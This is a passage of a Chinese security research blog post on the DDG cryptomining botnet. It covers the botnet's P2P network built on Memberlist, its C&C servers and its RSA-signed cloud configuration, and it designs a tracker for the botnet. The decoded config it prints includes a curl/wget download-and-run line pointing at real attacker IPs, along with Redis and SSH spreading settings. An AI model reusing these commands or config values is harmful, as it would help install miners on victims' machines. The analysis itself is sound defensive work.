<p>这只是比较简单粗暴的情况，即使没有一个持续控制的 C&amp;C 服务，我们也把它叫做 Botnet——Mining.Botnet。不过为了谨慎起见，窃以为还要加上一个特性：恶意程序的<strong>蠕虫特性</strong>。如果一个攻击者，它的相关恶意程序没有蠕虫特性，只是自己通过批量扫描+漏洞利用批量拿肉鸡，然后往肉鸡上批量植入恶意矿机程序来盈利，我们并不认为它植入的这些矿机程序组成了一个 Botnet。一旦有了蠕虫特性，恶意程序会自己主动传播，一步步构建成一个统一的<strong>网络</strong>，然后统一挖矿来为黑客牟利，我们才会把它叫做 Mining.Botnet(之所以有这个认识，可能是因为目前曝光的绝大多数稍具规模或者危害稍大的挖矿僵尸网络，其中恶意样本或多或少都有蠕虫特性)。</p>
<p>这样，纯粹的 Mining.Botnet 可以只满足文章开头提到的第一个特性，只要自身恶意程序有蠕虫特性，我们还是可以把它称为 Botnet。</p>
<p>当然，这只是为了说明 Botnet 网络架构微小变化而举的简单粗暴的例子。现实中遇到的 Mining.Botnet ，大多要更复杂一些。一般至少会有一个服务器提供恶意样本的下载，有的会提供一个云端的配置文件来控制矿机工作，有的会自建矿池代理服务，有的会在入侵、传播阶段设置更加复杂的服务端控制，还有的在持久驻留失陷主机方面做复杂的对抗……需要注意的是，这些真实存在的 Mining.Botnet 中，这些恶意服务器提供的多是下载、代理服务，而不一定具有传统 Botnet C&amp;C 服务那样<strong>下发控制指令</strong>的功能。</p>
<h3 id="1-2-对-Botnet-的处置措施"><a href="#1-2-对-Botnet-的处置措施" class="headerlink" title="1.2 对 Botnet 的处置措施"></a>1.2 对 Botnet 的处置措施</h3><p>对于 Botnet，安全研究人员 OR 安全厂商可以采取的措施，大致有以下几种：</p>
<ol>
<li>分析透彻 Botnet 样本工作原理、攻击链条、控制方式、通信协议以及网络基础设施，评估该 Botnet 可能造成的危害；梳理中招后的清除方案，提取相关 IoC 并公开给安全社区。安全厂商在安全产品中实现基于样本特征、通信协议或者 IoC 的防御措施，保护用户的安全。这样可以削弱整个 Botnet；</li>
<li>联合 ISP 和执法机构，封堵 Botnet 背后的网络基础设施，对域名采取 Sinkhole 措施或者直接禁止解析，阻断 IP 访问甚至控制 C&amp;C 服务器的主机。如果 Botnet 的网络基础设施比较脆弱，比如只有这么一个 C&amp;C 服务器，这样会直接端掉(Take Down)整个 Botnet；</li>
<li>根据对 Botnet 的协议特征、攻击方式等方面的分析，或者根据对其 C&amp;C 域名的 Sinkhole 数据，度量 Botnet 的规模，统计 Bot 节点的信息，联合有关方面清除 Bot 节点上的 Bot 程序。这样也会削弱整个 Botnet；</li>
<li>通过对 Botnet 的跟踪（监控云端配置文件、解析 C&amp;C 服务器的最新指令或者 P2P 追踪等等），监控 Botnet 的最新动向，方便采取一定防御措施；</li>
<li>对于有缺陷的 P2P Botnet，通过向 Botnet 投毒的方式清除整个 Botnet。</li>
</ol>
<p>简单总结起来，就是<strong>能干掉的就干掉，干不掉的就想办法将它削弱</strong>。</p>
<h2 id="2-DDG-Mining-Botnet"><a href="#2-DDG-Mining-Botnet" class="headerlink" title="2. DDG.Mining.Botnet"></a>2. DDG.Mining.Botnet</h2><p>DDG.Mining.Botnet(下文称 <strong>ddg</strong>) 是一个挖矿僵尸网络。ddg 最初的结构比较简单：</p>
<ul>
<li><strong>具有蠕虫功能的恶意程序</strong>(下文简称 <strong>主样本</strong>)可以利用漏洞来入侵主机实现自主传播；</li>
<li>有 1~3 个<strong>文件下载服务器</strong>提供矿机程序和恶意 Shell 脚本的下载，Shell 脚本被具有蠕虫功能的恶意程序下载到失陷主机中用来做定时任务，实现常驻失陷主机；恶意矿机程序则被 Shell 脚本不断下载、启动来挖矿。</li>
</ul>
<p>360Netlab 对 ddg 进行了长期跟踪，对它的几个主要版本进行详细分析并发布 <a href="https://blog.netlab.360.com/tag/ddg/" target="_blank" rel="external">系列技术报告</a>。现在，ddg 已经集成了 P2P 机制，实现了 Bot 节点间的互联互通，构建成了一个<strong>非典型</strong> P2P Botnet(下文会解释为什么称它<strong>非典型</strong>)。</p>
<p>不过我们没能把  ddg 干掉，只做到了<strong>追踪</strong>(因为它内部有基于 RSA 数字签名的校验机制，无法向僵尸网络投毒；也没能 Take Down 它的 C&amp;C Server)，这也是本文的主题。目前我们可以做到以下四点：</p>
<ul>
<li>及时获取当前 ddg 中的 Bot 节点信息；</li>
<li>及时获取它最新的云端配置数据；</li>
<li>即使获取它释放出来的最新恶意样本；</li>
<li>及时获知它最新启用的 C&amp;C Server。</li>
</ul>
<p>接下来就从 ddg 的核心特性说起，参考这些核心特性一步一步设计一个 P2P Botnet Tracker。</p>
<h3 id="2-1-ddg-的网络结构"><a href="#2-1-ddg-的网络结构" class="headerlink" title="2.1 ddg 的网络结构"></a>2.1 ddg 的网络结构</h3><p>相比最初的结构，ddg 当前版本有两个新特性：</p>
<ul>
<li>1~3 个文件下载服务器同时提供云端配置数据，ddg 的主样本会通过向 <code>http://&lt;c&amp;c_server&gt;/slave</code> 发送 Post 请求来获取配置数据；</li>
<li>僵尸网络内启用了P2P通信机制：集成了分布式节点控制框架 <a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">Memberlist</a>，该框架实现了扩展版的<strong>弱一致性分布式控制协议 <a href="http://www.cs.cornell.edu/projects/Quicksilver/public_pdfs/SWIM.pdf" target="_blank" rel="external">SWIM</a></strong> (扩展版的协议称为 <strong><a href="https://arxiv.org/pdf/1707.00788.pdf]" target="_blank" rel="external">Lifeguard</a></strong> )，并以此实现了 P2P 机制，用来管理自己的 Peers(Bots)。</li>
</ul>
<p>综合一下，当前集成了 P2P 机制的 ddg，网络结构概要图大致如下：</p>
<p><img src="/imgs/ddg_botnet_structure.png" style="zoom:50%"></p>
<p>上图黄色虚线聚焦的图标，代表 ddg 的恶意服务器，提供主样本程序、恶意 Shell 脚本和矿机程序的下载，还提供云端配置数据的下发服务。这里就可以解释前文中说 ddg 当前版本是<strong>非典型</strong> P2P Botnet 的理由了：</p>
<ul>
<li><strong>网络结构</strong>：典型的 P2P Botnet 网络结构，至少不会有中间一个<strong>中心化</strong>的文件和配置数据服务器，加上这么一个中心化的恶意服务器，显得 P2P 的网络结构不是那么“纯粹”。一个比较纯粹的 P2P Botnet ，网络结构可以参考名噪一时的 P2P Botnet <strong><a href="https://blog.netlab.360.com/hajime-status-report/" target="_blank" rel="external">Hajime</a></strong>，去除中间那个中心化的恶意服务器，所有指令、文件和配置数据的下发与传播，都靠 P2P 协议来实现，在 Bot 节点之间互相传递。而 ddg 这种网络结构，也使得它构建的 P2P 网络承载的功能比较鸡肋：只用来做 Bot 节点间的常规通信，不能承载 Botnet 的关键恶意活动；</li>
<li><strong>网络协议</strong>：构建 P2P 网络，无论是常见的 BT 文件共享网络还是恶意的 Botnet，比较多的还是基于 <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> 协议来实现。Hajime 和同样是 Go 语言编写的 P2P Botnet <strong><a href="https://vms.drweb.com/virus/?_is=1&amp;i=8436299" target="_blank" rel="external">Rex</a></strong> ，用来构建 P2P 网络的协议都是 DHT。而 ddg 构建 P2P 网络的框架则是本来在分布式系统领域用来做集群成员控制的 Memberlist 框架，该框架用基于 Gossip 的弱一致性分布式控制协议来实现。如果不太明白这个框架常规的应用场景，那么把它跟 <a href="https://en.wikipedia.org/wiki/Apache_ZooKeeper" target="_blank" rel="external">Apache ZooKeeper</a> 来对比一下或许更容易理解：它们都可用于分布式节点的服务发现，只不过 ZooKeeper 是强一致性的，而 Memberlist 是弱一致性(参考： <a href="https://www.jianshu.com/p/5e7e78788d12" target="_blank" rel="external">基于流言协议的服务发现存储仓库设计</a>)。</li>
</ul>
<p>基于以上两点，足够说明 ddg 是一个 <strong>非典型</strong> P2P Botnet。</p>
<h3 id="2-2-ddg-的-C-amp-C-服务器"><a href="#2-2-ddg-的-C-amp-C-服务器" class="headerlink" title="2.2 ddg 的 C&amp;C 服务器"></a>2.2 ddg 的 C&amp;C 服务器</h3><p>ddg 的服务器自从提供了云端配置数据的下发，便具备了传统僵尸网络中的 Command and Control 功能，所以可以名正言顺地称之为 C&amp;C 服务器。</p>
<p>ddg 的服务器地址，在是内置在主样本中的。在主样本中有一个 <strong>HUB IP List</strong> 的结构，里面有上百个 IP 地址的列表，这份列表中，绝大部分是失陷主机的 WAN_IP 地址，只有1~3 个是当前存活的 C&amp;C 地址(1 个 <strong>主 C&amp;C 服务器</strong>，2 个<strong>备用 C&amp;C 服务器</strong>)。主样本执行期间会遍历这份 IP 列表，找到可用的 C&amp;C 服务器地址，通过向 <code>http://&lt;c&amp;c_server&gt;/slave</code> 发送 Post 请求来获取配置数据。</p>
<p>云端配置数据是用 <a href="https://msgpack.org" target="_blank" rel="external">msgPack</a> 编码过的，解码后的配置数据中有最新的恶意 Shell 脚本下载地址，这个下载地址中的 IP 即为最新的 <strong>主 C&amp;C 服务器</strong>。</p>
<p>恶意的 Shell 脚本中会给出最新的主样本下载地址，这个下载地址中的 IP 也是最新的<strong>主 C&amp;C 服务器</strong>，目前来看，恶意 Shell 脚本中的 C&amp;C 地址与云端配置数据中提供的 C&amp;C 地址都是一致的。</p>
<p>这样一来，共有 3 中方式能获取到最新的 C&amp;C 服务器地址：</p>
<ol>
<li>解析 HUB IP List，通过遍历其中的 IP 列表来发现 C&amp;C 服务器地址；</li>
<li>解析恶意 Shell 脚本，提取其中的 C&amp;C服务器地址；</li>
<li>解析配置文件，提取其中的 C&amp;C 服务器地址。</li>
</ol>
<h3 id="2-3-ddg-的云端配置数据"><a href="#2-3-ddg-的云端配置数据" class="headerlink" title="2.3 ddg 的云端配置数据"></a>2.3 ddg 的云端配置数据</h3><p>前文提到过，ddg 的云端配置数据，是经过 msgPack 编码的，配置数据解码后的内容如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    'Data':&#123;</div><div class="line">        'CfgVer': 6,</div><div class="line">        'Cmd': &#123;</div><div class="line">            'AAredis': &#123;</div><div class="line">                'Duration': '240h',</div><div class="line">                'GenAAA': False,</div><div class="line">                'GenLan': True,</div><div class="line">                'IPDuration': '6h',</div><div class="line">                'Id': 6062,</div><div class="line">                'Ports': [6379, 6389, 7379],</div><div class="line">                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',</div><div class="line">                'Timeout': '1m',</div><div class="line">                'Version': 3017</div><div class="line">            &#125;,</div><div class="line">            'AAssh': &#123;</div><div class="line">                'Duration': '240h',</div><div class="line">                'GenAAA': False,</div><div class="line">                'GenLan': True,</div><div class="line">                'IPDuration': '12h',</div><div class="line">                'Id': 2057,</div><div class="line">                'NThreads': 100,</div><div class="line">                'Ports': [22, 2222, 12222, 52222, 1987],</div><div class="line">                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',</div><div class="line">                'Timeout': '1m',</div><div class="line">                'Version': 3017</div><div class="line">            &#125;,</div><div class="line">            'Killer': [&#123;</div><div class="line">                    'Expr': '(/tmp/ddgs.3011|/tmp/ddgs.3012|/tmp/ddgs.3013|/tmp/ddgs.3014|/tmp/ddgs.3015|   /tmp/ddgs.3016|/tmp/ddgs.3017|/tmp/ddgs.3019)',</div><div class="line">                    'Id': 475,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': '.+(cryptonight|stratum+tcp://|dwarfpool.com|supportxmr.com).+',</div><div class="line">                    'Id': 483,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': './xmr-stak|./.syslog|/bin/wipefs|./xmrig|/tmp/wnTKYg|/tmp/2t3ik',</div><div class="line">                    'Id': 484,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': '/tmp/qW3xT.+',</div><div class="line">                    'Id': 481,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;</div><div class="line">            ],</div><div class="line">            'LKProc': [&#123;</div><div class="line">                'Expr': '/tmp/qW3xT.5',</div><div class="line">                'Id': 488,</div><div class="line">                'Timeout': '60s',</div><div class="line">                'Version': 3020</div><div class="line">            &#125;],</div><div class="line">            'Sh': [&#123;</div><div class="line">                    'Id': 479,</div><div class="line">                    'Line': '(curl -fsSL hxxp://104.248.181.42:8000/i.sh||wget -q -O-  hxxp://132.148.241.138:8000/i.sh) | sh',</div><div class="line">                    'Timeout': '120s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Id': 486,</div><div class="line">                    'Line': 'chattr -i /tmp/qW3xT.5; chmod +x /tmp/qW3xT.5',</div><div class="line">                    'Timeout': '20s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;</div><div class="line">            ]</div><div class="line">        &#125;,</div><div class="line">        'Config': &#123;</div><div class="line">            'Interval': '60s'</div><div class="line">        &#125;,</div><div class="line">        'Miner': [&#123;</div><div class="line">            'Exe': '/tmp/qW3xT.5',</div><div class="line">            'Md5': 'fb6bf5af8771b0dc446861484335fc5e',</div><div class="line">            'Url': '/static/qW3xT.5'</div><div class="line">        &#125;]</div><div class="line">    &#125;,</div><div class="line">    'Signature': [0x3b,0xd9,0x73,0x04,0x6d,0x75,0x68,0xe8,0xdd,0xd6,0x0c,0x5e,0xac,0xd1,0x29,0x2d,0x16,0x31,0x03,0xf4,0xfb,0xbb,0xa8,0x7d,0xba,0x6a,0xc8,0xda,0x6f,0xec,0x42,0x16,0x6a,0x00,0x8b,0x62,0x3f,0xa1,0x11,0x9b,0x16,0xe8,0xf2,0x13,0xb1,0x45,0x40,0xc5,0xd4,0xc6,0xaa,0x90,0x99,0x98,0x4b,0xc9,0x70,0x66,0x77,0x18,0xa9,0x82,0x53,0xb9,0x4f,0x10,0x05,0xdf,0x8d,0x6c,0x3a,0x31,0x2b,0x45,0x6f,0x9d,0xcb,0xd2,0x7d,0x5e,0x90,0x5f,0xb9,0x59,0x9e,0xa2,0x40,0x02,0x1b,0xe9,0xed,0xd5,0x57,0xb5,0x09,0x41,0x1e,0xd8,0x41,0xd8,0x0b,0xa8,0xd1,0x54,0x00,0xab,0x43,0xdc,0x70,0xce,0xca,0x14,0xc5,0x19,0xc9,0x37,0x0f,0x19,0xe0,0x02,0x95,0x30,0x57,0xa6,0xbb,0xc4,0xa6,0x85,0x51,0xcc,0x9b,0x0d,0xc4,0xc5,0x7d,0xb9,0xc4,0xa0,0x93,0x00,0xec,0x52,0x06,0x77,0xfe,0x82,0x52,0x1e,0x88,0xf2,0xe2,0xc6,0x21,0x3e,0x81,0x7e,0x1e,0x53,0x9d,0xb0,0xab,0xd4,0xc2,0xa3,0x85,0x8b,0xef,0xac,0xdd,0x9d,0x4b,0x5a,0x13,0x8e,0xa1,0x31,0x6d,0xc5,0xb2,0xf4,0xca,0x54,0x85,0x29,0xa0,0x62,0x0d,0xac,0xde,0xfa,0x86,0x09,0x2b,0x1c,0x05,0x5f,0xa0,0xa4,0x91,0x11,0xb0,0x6d,0x7e,0x1c,0xab,0x31,0x6f,0xca,0x64,0x15,0x44,0xe5,0xaf,0x24,0x12,0xb6,0x74,0xde,0x9c,0xc1,0xf7,0x0c,0x22,0x80,0x1f,0x07,0x2b,0x57,0xe2,0xfb,0xf9,0x39,0x0b,0x1b,0x4f,0xa3,0x82,0x07,0xce,0x35,0x41,0x23,0x73,0x94,0x8c,0x27,0x1b,0x77,0x1f,0x5e,0xdd,0xb5,0xb1,0xa6,0xa1,0x6c]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意配置数据最后一项： <strong>Signature</strong> ，这其实是木马作者拿自己的 RSA 私钥对配置数据中的 <strong>Data</strong> 部分（真正用到的配置）生成的一个 RSA 签名字段。样本在解码配置数据之后，会用样本中内置的 RSA 公钥对 <strong>Data</strong> 部分配置数据进行校验，校验通过之后才会采用这些配置。样本中内置的 RSA 公钥如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1+/izrOGcigBPC+oXnr2  </div><div class="line">S3JI76iXxqn7e9ONAmNS+m5nLQx2g0GW44TFtMHhDp1lPdUIui1b1odu36i7Cf0g  </div><div class="line">31vdYi1i6nGfXiI7UkHMsLVkGkxEknNL1c1vv0qE1b2i2o4TlcXHKHWOPu4xrpYY  </div><div class="line">m3Fqjni0n5+cQ8IIcVyjkX7ON0U1n8pQKRWOvrsPhO6tvJnLckK0P1ycGOcgNiBm  </div><div class="line">sdA5WDjw3sg4xWCQ9EEpMeB0H1UF/nv7AZQ0etncMxhiWoBxamuPWY/KS3wZStUd  </div><div class="line">gsMBOAOOpnbxL9N+II7uquQQkMmO6HriXRmjw14OmSBEoEcFMWF2j/0HPVasOcx2  </div><div class="line">xQIDAQAB  </div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure>
<p>由此可见，这份配置数据无法伪造。这样一来，我们就只能加入 DDG 的 P2P 网络进行节点探测，而无法对整个 P2P 网络进行投毒。</p>
<h3 id="2-4-ddg-的-P2P-节点"><a href="#2-4-ddg-的-P2P-节点" class="headerlink" title="2.4 ddg 的 P2P 节点"></a>2.4 ddg 的 P2P 节点</h3><p>ddg 的主样本通过 Memberlist 框架成功加入了 P2P 网络之后，就会调用 <code>memberlist.Members()</code> 函数来获取当前 P2P 网络中的 Peers 列表。在 ddg 最近的几个版本中，主样本会把这份 Peers 列表保存到受害主机本地 <code>~/.ddg/&lt;VERSION_NUMBER&gt;.bs</code> 文件中。最新的版本则不会保存到本地，而是用开源的内嵌 KV 存储引擎 <a href="https://github.com/boltdb/bolt" target="_blank" rel="external">Bolt</a> 取代了之前的 <code>~/.ddg/&lt;VERSION_NUMBER&gt;.bs</code> 文件。即，样本获取到的 Peers 列表不再明文存储到本地文件中，而是存放到了内嵌的一个小型数据库中。</p>
<p>我们要获取 ddg 的 Peers 节点，就可以直接通过调用 <code>memberlist.Members()</code> 函数来获取。</p>
<h2 id="3-追踪程序设计"><a href="#3-追踪程序设计" class="headerlink" title="3. 追踪程序设计"></a>3. 追踪程序设计</h2><h3 id="3-1-追踪程序的执行流程"><a href="#3-1-追踪程序的执行流程" class="headerlink" title="3.1 追踪程序的执行流程"></a>3.1 追踪程序的执行流程</h3><p>前面说过，设计追踪程序的最终目标，有 4 个，其中涉及到 Peer 信息的获取和保存、样本与配置数据的解析和保存、记录最新启用的 C&amp;C Server ……这样一来，就不可避免地将相关数据和文件保存到本地或数据库中。</p>
<p>我们可以把最新一次探测到的 P2P 节点信息存储到数据库中，把样本文件、配置数据、最新的 C&amp;C Server 列表保存到本地文件中。根据 <strong>Memberlist</strong> 框架的实现，程序要调用 <code>memberlist.Join()</code> 函数来加入一个已存在的 P2P 网络，而这个函数需要一个 IP List( Go 变量 <code>[] string</code> ，下文简称 <strong>init_peers</strong>) 来作为加入 P2P 网络的“介绍人”。当然，这个 IP List 中的 IP，应该是当前已加入 P2P 网络的 IP (按照这个概念，这些 IP 应该是对应常规 P2P 网络中的 Node，P2P 网络中的 <strong>Node</strong> 和 <strong>Peer</strong> 的概念可以自行了解，为了简化描述，本文把 P2P 网络中的节点统称为 <strong>Peer</strong>)。</p>
<p>前文还说过，ddg 主样本中有一份内置硬编码的 HUB IP List。其实，这一份 HUB IP List 就可以拿来当做 <code>memberlist.Join()</code> 函数的参数，即 <strong>init_peers</strong>。为了方便程序运行，我们可以把这一份 IP List 提前保存到数据库中，追踪程序每次运行，都要先从数据库中读取最新的 <strong>init_peers</strong>，通过 <strong>init_peers</strong> 加入 ddg 的 P2P 网络。</p>
<p>这里先说一下追踪程序的概要执行流程，后面分步骤详细说明：</p>
<ol>
<li>从数据库中读取 <strong>init_peers</strong> IP List ，并调用 <strong>memberlist.Join()</strong> 加入 ddg 的 P2P 网络；</li>
<li>成功加入 P2P 网络后，调用 <code>memberlist.Members()</code> 获取当前网络中的最新 Peers List；</li>
<li>解析获取到的 Peers List 中的 Peers 信息，将每个 Peer 信息拆解成 <strong>IP:Port:Versioin:Hash:DateTime</strong> 5 元组，存到数据库中；</li>
<li>将每个 Peer IP ，拼接 URL 串 <code>http://&lt;peer_ip&gt;:8000/slave</code> ，并向该 URL 发送 Post 请求，以获取经过 msgPack 编码的配置数据；</li>
<li>如果成功从某个 Peer 上获取到了配置数据，则：<ul>
<li>将该 Peer IP 暂存到一个非重复的、并发安全的 IP List 结构中；</li>
<li>保存 RAW 格式的配置数据到本地；</li>
<li>用该 Peer IP 拼接 URL 串 <code>http://&lt;peer_ip&gt;:8000/i.sh</code> ，并用 HTTP GET 请求的方式尝试获取最新的恶意 Shell 脚本；</li>
<li>对比上述 i.sh 下载链接与刚获取到的最新配置数据中执行的 i.sh 下载链接是否相同，不同则对最新配置数据中指定的 i.sh 脚本也做下载&amp;解析操作。</li>
</ul>
</li>
<li>如果成功获取到 i.sh 脚本，则解析其中的样本 Download URL，下载样本，同本地已下载到的其他样本 MD5 和下载 URL 作对比，MD5 和 下载 URL 其中之一是新的，就保留样本，否则删除刚下载到的样本。对于新样本，通过 Slack 的 Message 接口 Push 相关消息到自己的 Slack Channel 中；</li>
<li>最后，将非重复的最新活跃的 C&amp;C Server 列表保存到本地文件中。</li>
</ol>
<h3 id="3-2-加入-P2P-网络"><a href="#3-2-加入-P2P-网络" class="headerlink" title="3.2 加入 P2P 网络"></a>3.2 加入 P2P 网络</h3><p>前文提到，调用 <code>memberlist.Join()</code> 来加入 ddg 的 P2P 网络，需要一个 <strong>init_peers</strong> 的 IP List。这个 IP List 最初来自 ddg 主样本中硬编码的 HUB IP List，而以后追踪程序每次执行，都要先从数据库中获取这个 IP List。这里先给出一个可用的数据表结构，用来存储 Peer 信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">+---------+----------------------+------+-----+---------+----------------+</div><div class="line">| Field   | Type                 | Null | Key | Default | Extra          |</div><div class="line">+---------+----------------------+------+-----+---------+----------------+</div><div class="line">| id      | int(10) unsigned     | NO   | PRI | &lt;null&gt;  | auto_increment |</div><div class="line">| ip      | char(16)             | NO   |     | &lt;null&gt;  |                |</div><div class="line">| port    | smallint(5) unsigned | NO   |     | &lt;null&gt;  |                |</div><div class="line">| version | smallint(5) unsigned | NO   |     | &lt;null&gt;  |                |</div><div class="line">| hash    | char(32)             | YES  |     | &lt;null&gt;  |                |</div><div class="line">| tdate   | datetime             | NO   |     | &lt;null&gt;  |                |</div><div class="line">+---------+----------------------+------+-----+---------+----------------+</div></pre></td></tr></table></figure>
<p>最新的 Peers 信息在我们加入 ddg 的 P2P 网络后可以调用 <code>memberlist.Members()</code> 来获取。在 <strong>Memberlist</strong> 框架的源码中，这个函数返回的是一个 Node 信息指针列表 (Go 语言变量 <code>[]*Node</code>)。Memberlist 框架中的 <strong>Node</strong> 结构体的定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Node represents a node in the cluster.</span></div><div class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</div><div class="line">	Name <span class="keyword">string</span></div><div class="line">	Addr net.IP</div><div class="line">	Port <span class="keyword">uint16</span></div><div class="line">	Meta []<span class="keyword">byte</span> <span class="comment">// Metadata from the delegate for this node.</span></div><div class="line">	PMin <span class="keyword">uint8</span>  <span class="comment">// Minimum protocol version this understands</span></div><div class="line">	PMax <span class="keyword">uint8</span>  <span class="comment">// Maximum protocol version this understands</span></div><div class="line">	PCur <span class="keyword">uint8</span>  <span class="comment">// Current version node is speaking</span></div><div class="line">	DMin <span class="keyword">uint8</span>  <span class="comment">// Min protocol version for the delegate to understand</span></div><div class="line">	DMax <span class="keyword">uint8</span>  <span class="comment">// Max protocol version for the delegate to understand</span></div><div class="line">	DCur <span class="keyword">uint8</span>  <span class="comment">// Current version delegate is speaking</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其中第一项 <strong>Name</strong> 是形如 <strong>VerNumber.HashValue</strong>  的一个字符串，如：<strong>3020.b1634b9e0c747a6ae728e07c40883e2d</strong> 。这里的 Hash 值在 Memberlist 框架中被定义为 <strong>UID</strong> ，每一个 Peer 都不同，其值是通过对当前 Peer 主机的网络配置用 MD5 算法计算得出。</p>
<p>Memberlist 的<a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">开源项目主页</a>上，有一个简单的 Usage Demo，演示加入一个集群(本文就指 ddg 的 P2P 网络了)并获取节点信息的最简方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/* Create the initial memberlist from a safe configuration.</div><div class="line">   Please reference the godoc for other default config types.</div><div class="line">   http://godoc.org/github.com/hashicorp/memberlist#Config</div><div class="line">*/</div><div class="line">list, err := memberlist.Create(memberlist.DefaultLocalConfig())</div><div class="line">if err != nil &#123;</div><div class="line">	panic(&quot;Failed to create memberlist: &quot; + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Join an existing cluster by specifying at least one known member.</div><div class="line">n, err := list.Join([]string&#123;&quot;1.2.3.4&quot;&#125;)</div><div class="line">if err != nil &#123;</div><div class="line">	panic(&quot;Failed to join cluster: &quot; + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Ask for members of the cluster</div><div class="line">for _, member := range list.Members() &#123;</div><div class="line">	fmt.Printf(&quot;Member: %s %s\n&quot;, member.Name, member.Addr)</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Continue doing whatever you need, memberlist will maintain membership</div><div class="line">// information in the background. Delegates can be used for receiving</div><div class="line">// events when members join or leave.</div></pre></td></tr></table></figure>
<p>可以看到在执行 <strong>Join()</strong> 函数加入集群之前，还要调用 <strong>memberlist.Create()</strong> 函数生成一个 Peer 对象(代表当前 Peer)，然后用当前对象执行 <strong>Join</strong> 以及后续操作。这里有一个关键点是当前 Peer 的配置。这份配置的底层结构体定义，在 <a href="https://godoc.org/github.com/hashicorp/memberlist#Config" target="_blank" rel="external">Memberlist 的 Godoc 文档</a>中有详细说明，此处不赘述。这份配置结构中的两个关键配置项(网络配置和密钥)，关乎到追踪程序能否成功加入到 ddg 的 P2P 网络中，以及加入之后能否正常与其他 Peers 通信，这两个关键点要<strong>逆向 ddg 主样本</strong>和熟知 <strong>Memberlist 的原理和实现</strong>才能搞定，这里也不赘述。想要自行实现这么一套追踪程序，需要自行完成这两个工作。</p>
<p>需要一提的是，配置项中有一个关于日志输出的配置项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// Logger is a custom logger which you provide. If Logger is set, it will use</div><div class="line">// this for the internal logger. If Logger is not set, it will fall back to the</div><div class="line">// behavior for using LogOutput. You cannot specify both LogOutput and Logger</div><div class="line">// at the same time.</div><div class="line">Logger *log.Logger</div></pre></td></tr></table></figure>
